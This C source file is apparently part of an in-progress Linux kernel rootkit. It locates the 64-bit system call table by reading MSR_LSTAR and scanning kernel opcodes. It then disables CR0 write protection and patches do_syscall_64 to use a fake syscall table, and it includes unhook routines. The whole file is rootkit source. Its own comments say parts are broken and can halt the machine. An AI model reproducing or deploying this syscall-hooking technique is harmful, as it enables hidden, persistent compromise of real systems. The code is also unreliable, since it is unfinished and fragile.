#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <asm/msr.h>
#include <asm/syscall.h>
#include <asm/paravirt.h>

#include "hook.h"
#include "log.h"
#include "utils.h"

// TODO: Document all the functions using Doxygen format.

// Backup where we store the original sys_call_table.
unsigned long *sys_call_table_backup = NULL;
unsigned char *do_syscall_64_patch_addr = NULL;

// Our fake sys_call_table.
unsigned long fake_sct[__NR_syscall_max+1];

int __patch_sct(void *addr_to_patch, unsigned long fake_sct[]) {
    const unsigned long WP_BIT = 0x0000000000010000;
    unsigned long cr0;

    if (addr_to_patch == NULL || fake_sct == NULL) {
        yarr_log("some param is NULL");
        return -1;
    }

    // Usually this memory area is write-protected, disable that, patch the
    // instruction, then set perms back.
    cr0 = read_cr0();
    write_cr0(cr0 & ~WP_BIT);
    
    // TODO: There's something interesting/weird/tricky. The instruction where
    // we patch uses a 32-bit immediate to encode the sys_call_table, however
    // the real address is 64-bit. This is possible because the processor
    // sign-extends the 32-bit immediate, but it has a limitation on where can
    // a sys_call_table reside. Either at addresses 0x000000007<something> or
    // 0xffffffff8<something>. If fake_sct resides on a memory position with
    // most significant bits different than those we are screwed up.
    //
    // TODO: Working here, this memcpy is halting the machine.
    //
    // TODO: What if memcpy gets interrupted in the middle of the overwrite?
    // Maybe we should do this atomically (i.e. interrupts disabled).
    memcpy(addr_to_patch, &fake_sct, 4);
    write_cr0(cr0 | WP_BIT);

    return 0;
}

int __hook_syscall_table_64(void) {
    unsigned char *entry_SYSCALL_64, *do_syscall_64, *addr_e8, *addr_8b;
    int displacement, sct_addr_encoded, i, err;
    unsigned long addr;

    // Get the address of the LSTAR MSR, it contains the entry point of
    // instruction syscall, entry_SYSCALL_64.
    rdmsrl(MSR_LSTAR, addr);
    entry_SYSCALL_64 = (unsigned char *)addr;
    if (entry_SYSCALL_64 == 0) {
        yarr_log("error retrieving MSR_LSTAR address");
        return -1;
    }

    yarr_log("entry_SYSCALL_64 at 0x%px", entry_SYSCALL_64);

    // Look for the first e8 byte. This byte is the opcode for a
    // near/relative call instruction.
    //
    // TODO: This is broken, the kernels I'm working with meet the requirement
    // of the first e8-byte being part of the call instruction that has the
    // address of the next function to look into (do_syscall_64), but if the
    // code changes, the way of building the kernel (optimizations, etc)
    // changes, or anything else provokes the assembler to change then this
    // will fail miserably.
    addr_e8 = lookup_byte(entry_SYSCALL_64, '\xe8', 0);
    if (addr_e8 == NULL) {
        yarr_log("error while looking up call instruction opcode (e8)");
        return -1;
    }

    yarr_log("addr_e8 at 0x%px", addr_e8);

    // Get the 4 bytes next to the call opcode (displacement).
    memcpy(&displacement, (void *)(addr_e8 + 1), 4);

    yarr_log("displacement is 0x%x(%d)", displacement, displacement);

    // Calculate the address of do_syscall_64.
    do_syscall_64 = (void *)(addr_e8 + 5 + displacement);

    yarr_log("do_syscall_64 is at 0x%px", do_syscall_64);

    // The function do_syscall_64 has the address of sys_call_table in one of
    // its instructions, specifically mov <num>(,%rdi,8),%rax. Here <num> is
    // the encoded address of the sys_call_table. This instruction in 64-bit
    // code looks like 48 8b 04 fd 00 00 00 00, where the trailing zeroes are
    // <num>. I rather look for the 8b byte (less common), and by the time I
    // was writing this, I'm interested in the third ocurrence.
    //
    // TODO: As with the previous lookup, this is broken if something changes
    // the assembler.
    addr_8b = lookup_byte(do_syscall_64, '\x8b', 2);

    yarr_log("addr_8b is at 0x%px", addr_8b);

    // Get the 4 bytes we are interested in.
    memcpy(&sct_addr_encoded, (void *)(addr_8b + 3), 4);

    // Now we know the address of sys_call_table, back it up for when we
    // unload. We promote first to long so there's sign extension and then to 
    // pointer so we omit a warning.
    sys_call_table_backup = (void *)(long)sct_addr_encoded;

    yarr_log("sys_call_table is at 0x%px", sys_call_table_backup);

    // Fulfill our fake sys_call_table with the real syscalls.
    for (i = 0; i < __NR_syscall_max + 1; i++) {
        fake_sct[i] = sys_call_table_backup[i];
    }

    yarr_log("Patching sys_call_table...");
    // Now we patch the instruction from where we got the sys_call_table
    // with our fake sys_call_table.
    //
    // TODO: This global should disappear when the patch subsystem is
    // developed.
    do_syscall_64_patch_addr = addr_8b + 3;
    err = __patch_sct((void *)(addr_8b + 3), fake_sct);
    if (err) {
        yarr_log("error patching the sys_call_table");
        return -1;
    }

    yarr_log("Patched sys_call_table");

    return 0;
}

int __unhook_syscall_table_64(void) {
    int err;

    if (sys_call_table_backup == NULL) {
        yarr_log("sys_call_table_backup is NULL");
        return -1;
    }

    // TODO: For now do a quick unpatch, but I should start thinking about the
    // patch tracker system and start using it here. Also returning here
    // doesn't seem like a good approach, try to unpatch/unhook/undo everything
    // you did while loading the module, even if some steps fail try with the
    // rest.
    err = __patch_sct(do_syscall_64_patch_addr, sys_call_table_backup);
    if (err) {
        yarr_log("error unpatching do_syscall_64");
        return -1;
    }

    return 0;
}

// TODO: For now I'm forcing the rootkit to work just on 64-bit kernels.
int hook_syscall_tables(void) {
    int err;

    // Hook the 64-bit system call table.
    err = __hook_syscall_table_64();
    if (err) {
        yarr_log("error hooking sys_call_table for 64-bit");
    }

    // TODO: Hook the 32-bit system call table.

    return 0;
}

int unhook_syscall_tables(void) {
    int err;

    // Unhook the 64-bit system call table.
    err = __unhook_syscall_table_64();
    if (err) {
        yarr_log("error unhooking sys_call_table for 64-bit");
    }

    // TODO: Unhook the 32-bit system call table.

    return 0;
}

